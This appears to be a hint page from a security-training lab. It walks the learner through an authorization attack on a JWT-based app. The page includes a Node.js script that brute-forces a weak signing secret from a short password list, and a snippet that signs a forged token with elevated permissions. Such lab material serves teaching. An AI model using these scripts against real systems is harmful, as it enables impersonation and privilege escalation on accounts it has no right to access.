<h5>Challenge Tips and Tricks</h5>
<p>
    In the previous challenge you have broken into the test account. In this challenge you must perform an authorization attack by obtaining more permissions. You can achieve that by attacking the authorization token. 
    The token is stored in the browser session storage.
    <br> <br>
    The application is using JWT for authentication. JWT contains a JSON object signed with a secret.
    Getting a hold of the JWT secret can prove devastating because attackers can impersonate anyone and can generate 'eternal' session identifiers
    (which never expire).
    The JWT secret in this case is very weak so you can easily crack it by writing a script that tries some of the most insecure passwords.
    <br> <br>
    In Node.JS you can use a script like this to verify a bunch of secrets:
    <pre class="pre-scrollable">
        const jwt = require('jsonwebtoken');
        var token = "ENTER_THE_TOKEN";
        var secrets = ["passw0rd","secret","1234"];
        //if you're looking for secrets there's a good list here: https://www.theregister.co.uk/2010/01/21/lame_passwords_exposed_by_rockyou_hack/
        for(var secret of secrets){

            jwt.verify(token, secret, function(err, decoded) {
                if (!err) {
                    console.log('authorized:', decoded);
                }
            });

        };
    </pre>
    Pay attention to the structure of the decoded test account. Change the properties of the javascript object to include more permissions. 
    <br>
    Have a look at the Network tab of your browser debugger. Some requests are returning an unauthorized status code. Alter the permissions to make all the requests accessible.
    <br>

    In Node.JS you can generate JWT tokens with a script like this:
    <br>
    <pre class="pre-scrollable">
            const jwt = require('jsonwebtoken');
            var token = jwt.sign(userObject, "SECRET");
            console.log(token);
    </pre>
    <br>
    IMPORTANT: Once you successfully replaced the authentication token have a look at some of the first messages in the chat. They may help you in your future challenges.
